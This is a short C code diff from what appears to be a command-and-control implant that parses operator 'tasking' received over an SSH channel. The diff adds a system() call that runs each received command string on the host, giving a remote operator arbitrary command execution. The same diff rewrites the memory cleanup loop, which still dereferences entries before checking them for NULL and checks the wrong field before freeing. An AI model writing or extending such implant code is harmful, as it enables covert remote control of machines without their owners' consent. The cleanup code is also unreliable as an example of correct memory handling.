@@ -360,6 +360,7 @@ int parse_tasking(char *tasking, ssh_channel chan){
 			break;
 		case AGENT_EXEC_SC:
 			printf("Got tasking to execute command %s\n", tasking_arr[j]->opts);
+			system(tasking_arr[j]->opts);
 			break;
 		case AGENT_EXEC_MODULE:
 			printf("Got tasking to execute module %s\n", tasking_arr[j]->opts);
@@ -379,12 +380,12 @@ int parse_tasking(char *tasking, ssh_channel chan){
 	}
 
 	// free all stuff
-	for(int k = 0; k < sizeof(tasking_arr); k++){
+	for(int k = 0; k < num; k++){
 		// Something is broken in here
 		printf("Freeing shit.\nOperation: %d\nOptions: %s\n", tasking_arr[k]->operation, tasking_arr[k]->opts);
 		if(tasking_arr[k] == NULL) continue;
-		free(tasking_arr[k]->opts);
-		free(tasking_arr[k]);
+		if(tasking_arr[k]->opts != NULL) free(tasking_arr[k]->opts);
+		if(tasking_arr[k]->operation != NULL) free(tasking_arr[k]);
 	}
 	printf("Finished freeing shit\n");
 	return 0;
